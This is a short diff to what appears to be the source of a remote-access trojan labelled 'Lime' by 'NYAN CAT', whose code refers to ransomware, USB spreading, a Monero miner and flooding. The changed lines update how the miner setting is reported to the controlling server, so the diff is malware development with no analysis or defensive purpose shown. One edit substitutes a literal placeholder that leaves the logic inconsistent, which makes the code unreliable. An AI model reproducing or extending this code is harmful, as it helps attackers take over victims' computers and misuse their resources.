@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##        N Y A N   C A T  |||   Updated on Sept/09/2018        ##
+'##        N Y A N   C A T  |||   Updated on Sept/14/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -112,7 +112,7 @@ Namespace Lime
 
             Dim OldRans As String = C_ID.Rans
             Dim OldUSB As String = C_ID.USBSP
-            Dim OldXMR As String = C_ID.XMR
+            Dim OldXMR As String = "..."
             Dim OldFLD As String = C_ID.Flood
             C_Nosleep.No_Sleep()
 
@@ -144,7 +144,7 @@ Namespace Lime
 
                         Try
                         If OldXMR <> C_ID.XMR Then
-                            OldXMR = GTV("XMR")
+                            OldXMR = C_ID.XMR
                             C.Send("!X" & SPL & OldXMR)
                         End If
                     Catch ex As Exception
